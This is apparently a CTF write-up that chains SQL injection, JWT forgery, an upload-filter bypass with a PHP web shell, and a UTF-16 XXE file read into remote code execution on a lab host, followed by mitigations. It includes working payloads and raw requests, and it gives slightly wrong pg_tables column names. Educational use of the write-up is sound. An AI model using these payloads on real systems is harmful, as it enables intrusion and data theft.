@@ -1,0 +1,567 @@
+---
+title: "EYCC: Mall Albostan"
+description: "A search box concatenates SQL, so we UNION out the JWT secret, forge an admin token, sneak a .phtml shell past a blacklist, and pivot through a UTF-16 XXE to find where it landed. SQLi to RCE, end to end."
+date: 2026-07-31T00:00:00.000Z
+---
+
+**Platform:** EYCC
+**Challenge:** Mall Albostan
+**Category:** Web
+**Difficulty:** Medium
+**Points:** 484
+**Author:** 00xcanelo
+
+**Solved by 0xAdham and 0xMero.**
+
+Mall Albostan, Downtown Cairo's go-to spot for laptops, GPUs, and everything in between, just launched its first online storefront and internal vendor dashboard. The dev team built it fast to get ahead of the holiday rush — registration's open to anyone, but the actual store management lives behind an admin login that, as far as they're concerned, nobody outside the team will ever see.
+
+Link: `https://mall-albostan.chals.eycc.2hwa.xyz`
+
+## From SQL Injection to RCE
+
+### TL;DR
+
+This challenge chained together five bugs:
+
+1. **SQL injection** → leak the JWT secret
+2. **Forge a session with `role: admin`** → authenticate as admin
+3. **Bypass the file-upload restrictions** → upload a PHP shell
+4. **XXE** → leak the uploaded file's UUID
+5. **Access the shell with that UUID** → RCE → read the flag
+
+![Attack chain diagram](/blog/eycc-mall-albostan/attack-chain.svg)
+
+## Chapter 1: Examining the Source Code
+
+I won't walk through all of the source, just the parts that matter.
+
+After reading `register.php` and `login.php` I found nothing abnormal — simple login and register logic.
+
+Let's look at `search.php` in the `api` folder:
+
+```php
+<?php
+require_once __DIR__ . '/../lib/auth.php';
+$user = require_login(); // any authenticated user (role=user is enough)
+
+$db = get_db();
+$q = $_GET['q'] ?? '';
+$results = [];
+$ran = false;
+
+if ($q !== '') {
+    $ran = true;
+    $sql = "SELECT id, name, description, price, category FROM products "
+        . "WHERE name LIKE '%$q%' OR category LIKE '%$q%'";
+
+    $res = $db->query($sql);
+    if ($res !== false) {
+        while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
+            $results[] = $row;
+        }
+    }
+}
+?>
+```
+
+That `$q` goes straight into the query string — **first vulnerability: SQL injection.**
+
+In `seed.php` we found:
+
+```php
+<?php
+
+$appDbFile     = __DIR__ . '/../data/app.db';
+$uploadsDbFile = __DIR__ . '/../data/uploads.db';
+
+if (file_exists($appDbFile) && file_exists($uploadsDbFile)) {
+    exit(0);
+}
+
+$db = new SQLite3($appDbFile);
+
+$db->exec("CREATE TABLE users (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    username TEXT UNIQUE NOT NULL,
+    password_hash TEXT NOT NULL,
+    role TEXT NOT NULL DEFAULT 'user'
+)");
+
+$db->exec("CREATE TABLE app_config (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    key TEXT UNIQUE NOT NULL,
+    value TEXT NOT NULL
+)");
+
+$db->exec("CREATE TABLE products (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    name TEXT NOT NULL,
+    description TEXT,
+    price REAL,
+    category TEXT
+)");
+
+$secret = bin2hex(random_bytes(32));
+$stmt = $db->prepare("INSERT INTO app_config (key, value) VALUES ('jwt_secret', ?)");
+$stmt->bindValue(1, $secret, SQLITE3_TEXT);
+$stmt->execute();
+
+$randomAdminPass = bin2hex(random_bytes(16));
+$stmt = $db->prepare("INSERT INTO users (username, password_hash, role) VALUES ('admin', ?, 'admin')");
+$stmt->bindValue(1, password_hash($randomAdminPass, PASSWORD_BCRYPT), SQLITE3_TEXT);
+$stmt->execute();
+
+$products = json_decode(file_get_contents(__DIR__ . '/products.json'), true);
+
+if ($products === null) {
+    die('Invalid products.json: ' . json_last_error_msg());
+}
+
+$stmt = $db->prepare("INSERT INTO products (name, description, price, category) VALUES (?, ?, ?, ?)");
+foreach ($products as $p) {
+    $stmt->bindValue(1, $p['name'], SQLITE3_TEXT);
+    $stmt->bindValue(2, $p['description'], SQLITE3_TEXT);
+    $stmt->bindValue(3, $p['price'], SQLITE3_FLOAT);
+    $stmt->bindValue(4, $p['category'], SQLITE3_TEXT);
+    $stmt->execute();
+    $stmt->reset();
+}
+
+$uploadsDb = new SQLite3($uploadsDbFile);
+
+$uploadsDb->exec("CREATE TABLE uploads (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    uuid_filename TEXT NOT NULL,
+    original_name TEXT,
+    uploaded_by TEXT,
+    uploaded_at DATETIME DEFAULT CURRENT_TIMESTAMP
+)");
+
+echo "[seed] databases initialized\n";
+```
+
+This page hands us the whole schema — the table structures (column names and datatypes) and the two databases in play (`app.db`, `uploads.db`).
+
+Writing down the findings:
+
+1. We know the table structure in both `app.db` and `uploads.db`.
+2. There's an `app_config` table with `key`/`value` columns, and one of the keys is literally `jwt_secret`.
+
+Keep this in mind — we'll need it soon.
+
+Let's look at a more interesting folder: `admin`.
+
+In `admin` we find `import.php`, `upload.php`, and `index.php`. There's nothing interesting in `index.php` (except that we need an admin role in our session to reach it), so we focus on the other two.
+
+`upload.php` has an upload function with a blocklist of extensions: **`php`, `php1`, `php2`, `php3`, `php4`, `php5`, `php7`, `php8`, `pht`, `phps`, `phar`, `pl`, `py`, `rb`, `sh`, `exe`, `bat`.**
+
+But notice — Canelo forgot to add `.phtml` 😃
+
+See how I'll get RCE on your server, Canelo — you have to bear the consequences of your mistake 💀
+
+`import.php` has a weak XML validation function that we can bypass several easy ways (covered in the **Exploiting XXE** section).
+
+So, to recap what we have:
+
+1. Full knowledge of the database schema — database names, tables, columns, and datatypes.
+2. A SQLi in the search field via `search.php`.
+3. A non-blocked PHP extension (`.phtml`) we can use to upload a shell.
+4. A weak XML validation function.
+
+Now for the fun part.
+
+## Chapter 2: Exploiting the Discovered Vulnerabilities
+
+After logging in, we land on this page.
+
+![Landing page after login](/blog/eycc-mall-albostan/landing-page.png)
+
+### Section 1: SQL Injection — Leaking the JWT Secret
+
+After clicking **Browse Catalog**, we're redirected to `products.php`, where whatever we type in the search box is passed as the `q` GET parameter to `/api/search.php` and dropped straight into the SQL query — no sanitization, no parameterized statements.
+
+![Products search page](/blog/eycc-mall-albostan/products-search.png)
+
+From the schema we already know there's a table holding the JWT secret, so that's the first thing we grab.
+
+Back to this table:
+
+```sql
+CREATE TABLE app_config (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    key TEXT UNIQUE NOT NULL,
+    value TEXT NOT NULL
+)
+```
+
+We know the columns and types, but first we need the number of columns in the original query to line up a UNION. 🔥
+
+And we need to know how the app behaves on error, so we can tell a broken query from a working one.
+
+First, deliberately break it:
+
+![Broken query returns no output](/blog/eycc-mall-albostan/sqli-error.png)
+
+The error isn't shown.
+
+Now a valid query:
+
+![Valid query returns rows](/blog/eycc-mall-albostan/sqli-valid.png)
+
+Good. 🔥 Behavior confirmed: nothing on error, and on a correct query it reflects the output back. Let's extract `app_config`:
+
+```sql
+laptop' UNION SELECT 'test', 'KEY: ' || key, 'Value: ' || value ,'test','test'  FROM app_config --
+```
+
+![UNION leaks the JWT secret](/blog/eycc-mall-albostan/sqli-jwt-secret.png)
+
+`||` concatenates `TEXT` values in SQLite.
+
+### Section 2: Forging an Admin Session
+
+Now that we have the secret, we sign our own session cookie with it and set `role` to `admin` without breaking the signature.
+
+For this we use [jwt_tool](https://github.com/ticarpi/jwt_tool):
+
+```bash
+python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1lcm8iLCJyb2xlIjoidXNlciIsImlhdCI6MTc4NTM0MDk4MH0.TnN_XlOm0pXw_S1vmcVZyaCeinqmBU0UONBP6Qz4bgs -S hs256 -p 71805484665bfc39282d6c491ace51cfae213e5c4d8f82bb63f592147caf0c61 -T
+```
+
+The tool takes the JWT as the first positional argument; the rest are options:
+
+- `-S hs256` — the signing algorithm for the signature.
+- `-p <secret>` — the secret key used to sign the token.
+- `-T` — interactive tamper mode. We edit the claims, and the tool re-signs with the provided secret, producing a valid JWT.
+
+```text
+Token payload values:
+[1] username = "mero"
+[2] role = "user"
+[3] iat = 1785245218    ==> TIMESTAMP = 2026-07-28 16:26:58 (UTC)
+
+Please select a field number:
+> 2
+
+Current value of role is: user
+Please enter new value and hit ENTER
+> admin
+
+jwttool_... - Tampered token - HMAC Signing:
+[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1lcm8iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODUzNDA5ODB9.ZPuJG5Qpwr1ZdEB4lWDlFzjrnOFVQjr6MToROOm4NlY
+```
+
+And that's our new valid admin session 😍:
+
+```text
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1lcm8iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODUzNDA5ODB9.ZPuJG5Qpwr1ZdEB4lWDlFzjrnOFVQjr6MToROOm4NlY
+```
+
+After swapping the token into browser storage, the admin page opens right up:
+
+![Admin page accessible with the forged token](/blog/eycc-mall-albostan/admin-access.png)
+
+### Section 3: Uploading a Shell
+
+The admin page lets us upload an attachment (JPEG, PNG, GIF, WebP) and import an XML profile.
+
+![Admin upload + import XML page](/blog/eycc-mall-albostan/admin-upload-import.png)
+
+Start with the upload function. It claims to accept only (JPEG, PNG, GIF, WebP) — in practice, not exactly, as we'll break it. 🥱
+
+Upload a normal GIF first.
+
+![Normal GIF accepted](/blog/eycc-mall-albostan/upload-gif.png)
+
+As expected, accepted. But I want to know *how* the server validates — the `Content-Type` header, the magic bytes (the first few bytes of a file), or the extension. Let's find out.
+
+A blocked extension gives this message:
+
+![Blocked extension rejected](/blog/eycc-mall-albostan/upload-blocked-ext.png)
+
+I uploaded a `.php` file (knowing it's a blocked extension) and got rejected. Yes, I'm trying to hack you, and I will.
+
+Now upload a `.phtml` file with `Content-Type: application/x-httpd-php`, to see whether the server checks content type:
+
+![.phtml accepted](/blog/eycc-mall-albostan/upload-phtml-accepted.png)
+
+Accepted — so it doesn't check the content type. Let's turn it into a shell.
+
+Write this into the `.phtml` file and upload it for RCE:
+
+```php
+<?php system($_GET['cmd']) ; ?>
+```
+
+It runs whatever command we pass in the `cmd` parameter. Example: `example.com/shell.phtml?cmd=ls` runs `ls` and reflects its output.
+
+Upload the shell:
+
+![Shell rejected](/blog/eycc-mall-albostan/upload-shell-rejected.png)
+
+Rejected? Maybe the server reads the magic bytes. Let's prepend a GIF magic byte.
+
+![Shell accepted with GIF magic bytes](/blog/eycc-mall-albostan/upload-shell-success.png)
+
+There we go — shell uploaded. Getting close, Canelo. Only a matter of time.
+
+But things don't always go as planned — this isn't the last step. The server stores uploads under a generated UUID, not their original name, because of this in `upload.php`:
+
+```php
+$uuid = generate_uuid4();
+$destName = $uuid . '.'. $ext;
+$destPath = __DIR__ . '/../uploads/' . $destName;
+```
+
+So we still need the UUID our shell landed under.
+
+### Section 4: XXE — Leaking `uploads.db`
+
+The problem Canelo left us with: the shell is uploaded, but it's stored under a random UUID we don't know. That UUID lives in `uploads.db` — a file that's `Require all denied` over HTTP, so we can't just request it. We need to read it off the filesystem. That's where the `import.php` XXE comes in.
+
+The "Import Settings" page takes XML from `POST xml`, parses it server-side, and echoes every element's text content back into the Result box. That echo is our exfil channel — whatever an entity resolves to gets reflected straight back to us (classic **in-band XXE**).
+
+![Import Settings result box](/blog/eycc-mall-albostan/import-settings.png)
+
+**The vulnerable code (`/admin/import.php`):**
+
+```php
+function is_safe_xml(string $xml): bool {
+    if (stripos($xml, '<!DOCTYPE') !== false) {   // (1) the "filter"
+        return false;
+    }
+    return true;
+}
+
+$xml = $_POST['xml'];
+if (!is_safe_xml($xml)) {
+    $result = 'Rejected: invalid document format.';
+} else {
+    libxml_use_internal_errors(true);
+    $doc = new DOMDocument();
+    $doc->resolveExternals    = true;                                       // (2)
+    $doc->substituteEntities  = true;                                       // (2)
+    $loaded = $doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR); // (2)
+
+    foreach ($doc->getElementsByTagName('*') as $node) {                    // (3) reflection
+        if ($node->childNodes->length === 1 && $node->firstChild->nodeType === XML_TEXT_NODE) {
+            $result .= $node->nodeName . ': ' . $node->nodeValue . "\n";
+        }
+    }
+}
+```
+
+**Where the vuln is:** the parser is configured maximally dangerous — everything at `(2)` pushes the same way:
+
+| Setting | Effect |
+| --- | --- |
+| `resolveExternals = true` | Resolve external entities (`SYSTEM "..."`) |
+| `substituteEntities = true` | Expand entities into the node tree |
+| `LIBXML_NOENT` | Substitute entities (misleading name — it **enables** substitution) |
+| `LIBXML_DTDLOAD` | Load the DTD / internal subset (`<!DOCTYPE ...>`) |
+
+If a `<!DOCTYPE>` carrying an external entity reaches `loadXML`, libxml fetches the file off disk and inlines it; the loop at `(3)` prints it back → **arbitrary file read as `www-data`.**
+
+Canelo knew XXE was the risk — that's the whole point of `is_safe_xml()` at `(1)`. The bug: the "defense" is a **string blacklist on the raw request bytes** (`stripos` for the literal `<!DOCTYPE`), not a parser-level control. And a byte blacklist guarding a spec-driven parser is exactly the kind of gap we look for.
+
+**The bypass — encoding mismatch (UTF-16):**
+
+`stripos($xml, '<!DOCTYPE')` searches for the **literal ASCII bytes** `3C 21 44 4F 43 54 59 50 45`. But `DOMDocument::loadXML` is a full XML processor — per the XML spec it auto-detects encoding from the **BOM / XML declaration**. That gap is the bypass.
+
+We submit the *same* document as **UTF-16**:
+
+- On the wire, `<!DOCTYPE` becomes `3C 00 21 00 44 00 4F 00 43 00 54 00 59 00 50 00 45 00` — every ASCII char followed by a `00`. The contiguous ASCII string `<!DOCTYPE` **no longer exists in the bytes** → `stripos` returns `false` → filter passes.
+- libxml sees the UTF-16 BOM (`FF FE`), decodes back to real characters, sees a valid `<!DOCTYPE>`, and processes the entity.
+
+One reader parses **bytes**, the other parses **characters** — the blacklist loses.
+
+This must be sent as raw UTF-16 bytes in the `xml` param. Pasting into the browser textarea fails — the browser re-encodes the form to UTF-8, restoring the ASCII `<!DOCTYPE` → blocked. So we build it in Burp.
+
+**The payload:**
+
+Simple proof first (a text file, reflected directly):
+
+```xml
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<r>&xxe;</r>
+```
+
+But our real target, `uploads.db`, is a **binary** SQLite file. Raw binary bytes break the XML text node (null bytes, non-UTF-16 sequences), so we wrap it in `php://filter/convert.base64-encode` — that turns the file into clean base64 text that survives the echo intact. That's why this specific payload:
+
+```xml
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/data/uploads.db">]>
+<r>&x;</r>
+```
+
+**Delivery** — send the UTF-16 bytes URL-encoded into `xml=`. Raw Burp request (spaces as `%20`, every char followed by `%00`, BOM `%FF%FE` up front, **no trailing newline** after the last `%00`):
+
+```http
+POST /admin/import.php HTTP/2
+Host: mall-albostan.chals.eycc.2hwa.xyz
+Cookie: token=<admin JWT from Section 2>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 744
+
+xml=%FF%FE%3C%00%3F%00x%00m%00l%00%20%00v%00e%00r%00s%00i%00o%00n%00%3D%00%22%001%00.%000%00%22%00%20%00e%00n%00c%00o%00d%00i%00n%00g%00%3D%00%22%00U%00T%00F%00-%001%006%00%22%00%3F%00%3E%00%0A%00%3C%00%21%00D%00O%00C%00T%00Y%00P%00E%00%20%00r%00%20%00%5B%00%3C%00%21%00E%00N%00T%00I%00T%00Y%00%20%00x%00%20%00S%00Y%00S%00T%00E%00M%00%20%00%22%00p%00h%00p%00%3A%00%2F%00%2F%00f%00i%00l%00t%00e%00r%00%2F%00c%00o%00n%00v%00e%00r%00t%00.%00b%00a%00s%00e%006%004%00-%00e%00n%00c%00o%00d%00e%00%2F%00r%00e%00s%00o%00u%00r%00c%00e%00%3D%00%2F%00v%00a%00r%00%2F%00w%00w%00w%00%2F%00h%00t%00m%00l%00%2F%00d%00a%00t%00a%00%2F%00u%00p%00l%00o%00a%00d%00s%00.%00d%00b%00%22%00%3E%00%5D%00%3E%00%0A%00%3C%00r%00%3E%00%26%00x%00%3B%00%3C%00%2F%00r%00%3E%00
+```
+
+These UTF-16 bytes are alignment-sensitive — every byte counts. Three ways it silently breaks (all cost me a send before I caught them):
+
+| Symptom in the Result box | Cause | Fix |
+| --- | --- | --- |
+| `Rejected: invalid document format.` | Body sent as **ASCII** (browser textarea, or `%3C%21DOCTYPE…` with no `%00` nulls) → `stripos` matches | Send real UTF-16 bytes (`%FF%FE`, every char + `%00`) |
+| `Extra content at the end of the document` | Trailing **CRLF** after the body → UTF-16LE reads `0D 0A` as one non-whitespace char after `</r>` | Delete the trailing newline; body must end on the last `%00` |
+| `String not started expecting ' or "` | Spaces encoded as `+` and sent literally → `SYSTEM+"…` | Percent-encode spaces as `%20`, not `+` |
+
+**Proof:** the entity `&x;` resolves to the base64 of `uploads.db` and gets echoed straight back:
+
+![Base64 of uploads.db reflected in the result box](/blog/eycc-mall-albostan/xxe-uploads-db-b64.png)
+
+Decode it and read the upload table to recover our shell's UUID:
+
+```bash
+base64 -d b64.txt > uploads.db
+sqlite3 uploads.db 'SELECT * FROM uploads;'
+# 4263252f-1f66-4f0e-ae8b-fecb021b269c.phtml|shell.phtml|mero|2026-07-29 20:38:10
+```
+
+There it is — the UUID of the `.phtml` shell we uploaded in Section 3. `uploads.db` was denied over HTTP but wide open to a filesystem read via XXE. Now we know exactly where our shell lives, which is the last thing we needed before we can hit it for RCE.
+
+Worth noting *why* we even need XXE here: PHP/libxml XXE can only read **known** paths — it can't list directories. So it can't find the randomly-named flag directly. But it doesn't need to: it reads `uploads.db` (a known path), which hands us the UUID, which makes the shell reachable. The shell does the directory listing XXE can't. **XXE is the pivot, not the finisher.**
+
+## Chapter 3: Reading the Flag 🚩
+
+With the shell's UUID recovered, we can hit its URL directly:
+
+```text
+https://mall-albostan.chals.eycc.2hwa.xyz/uploads/4263252f-1f66-4f0e-ae8b-fecb021b269c.phtml?cmd=whoami
+```
+
+Output:
+
+![whoami confirms RCE](/blog/eycc-mall-albostan/rce-whoami.png)
+
+**Yes — RCE confirmed.**
+
+Now list the root directory:
+
+![Listing the root directory](/blog/eycc-mall-albostan/rce-ls-root.png)
+
+The flag is right there 😍 — `flag_dff347a6f2124a7184303ea2a6c89045.txt`.
+
+The long-awaited moment:
+
+```bash
+cat /flag_dff347a6f2124a7184303ea2a6c89045.txt
+```
+
+![Reading the flag](/blog/eycc-mall-albostan/flag.png)
+
+The chain is complete, and the flag is ours.
+
+```text
+EYCC{...}
+```
+
+## Mitigations
+
+**Prevent SQL Injection**
+
+- Use parameterized queries (prepared statements) instead of concatenating user input into SQL. For example:
+
+```php
+$sql = "SELECT id, name, description, price, category
+        FROM products
+        WHERE name LIKE ? OR category LIKE ?";
+```
+
+instead of:
+
+```php
+$sql = "SELECT id, name, description, price, category
+        FROM products
+        WHERE name LIKE '%$q%' OR category LIKE '%$q%'";
+```
+
+**Protect JWT Secrets**
+
+- Never hardcode JWT secrets in source or in the database.
+- Store secrets in environment variables or a dedicated secrets manager.
+- Rotate signing keys periodically and immediately after any suspected compromise.
+
+**Secure File Uploads**
+
+- Use a whitelist of allowed extensions instead of a blacklist.
+- Validate the file's MIME type and magic bytes.
+- Store uploaded files outside the web root whenever possible.
+- Disable script execution in the upload directory.
+
+**Prevent XXE Attacks**
+
+- Disable external entity resolution in the XML parser.
+- Use secure parser configurations instead of custom validation logic.
+- Validate XML against a trusted schema when appropriate.
+
+In conclusion, thanks to **Canelo** for creating such an enjoyable challenge, and to **Mont5ab El2hwa** for organizing an amazing CTF. See you in the finals! 🫡
+
+---
+
+## Pro Tip
+
+Think the write-up is over? Not quite.
+
+How would we know the available tables and their columns if they weren't handed to us in the source? Here's the hard way to get the database's structure yourself.
+
+Every database has table(s) called **system catalogs**, and their location differs between engines. In MySQL, system catalogs live in a separate database called `information_schema`, which contains tables like `columns` and `tables`. In PostgreSQL, they live in a schema called `pg_catalog`. Don't worry — we'll explain everything.
+
+### What is a system catalog?
+
+A system catalog is a set of tables (and sometimes views) that store metadata about the database itself — its tables, columns, indexes, views, users, and other objects. In short: tables that describe other database objects.
+
+### What is a schema?
+
+Schema isn't a constant definition across all databases:
+
+- In **MySQL**, `schema` and `database` mean the same thing — there's no distinction.
+- In **PostgreSQL**, a schema is a logical grouping of tables — think of it like a folder. There's a schema called `public` for user-created tables, and another called `pg_catalog` for the system catalogs.
+
+### System catalogs per database
+
+**MySQL:** a database called `information_schema` containing tables like `columns` and `tables`. These have useful columns such as `table_name`, `table_type`, and `table_schema`.
+
+**PostgreSQL:** system catalogs live under the `pg_catalog` schema — for example, `pg_catalog.pg_tables` and `pg_catalog.pg_database`. They contain columns like `table_name` and `schema_name`.
+
+**SQLite:** one table holds information about the database's tables, called `sqlite_master`. Its columns are `type`, `name`, `tbl_name`, `rootpage`, and `sql` — the most important being `sql`, since it contains the exact statement the table was created with.
+
+For example:
+
+```sql
+SELECT sql FROM sqlite_master;
+```
+
+We get the statement showing how each table was created:
+
+```sql
+CREATE TABLE uploads (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    uuid_filename TEXT NOT NULL,
+    original_name TEXT,
+    uploaded_by TEXT,
+    uploaded_at DATETIME DEFAULT CURRENT_TIMESTAMP
+)
+CREATE TABLE sqlite_sequence(name, seq)
+```
+
+### What is a view?
+
+A view isn't an actual table — it's a virtual one. It doesn't store real data; it stores a query. When someone queries a view, it fetches its data from the actual system catalog behind the scenes.
+
+For example, in PostgreSQL we can run `SELECT * FROM information_schema.tables`, although this isn't PostgreSQL's real system catalog — it's a **view**. Under the hood, it runs a query against the real catalog tables in `pg_catalog` (like `pg_class` and `pg_namespace`) and returns the result. MySQL works the same way — `information_schema.tables` is also a view over the server's internal metadata, not a raw table.
+
+![information_schema sits on top of pg_catalog](/blog/eycc-mall-albostan/system-catalog-diagram.svg)
+
+The purple arrow is the key thing to notice: `information_schema` sits on top and reads from `pg_catalog` underneath — it's not a second, competing source of truth, just a portable wrapper around the real metadata.
+
+*0xAdham & 0xMero*
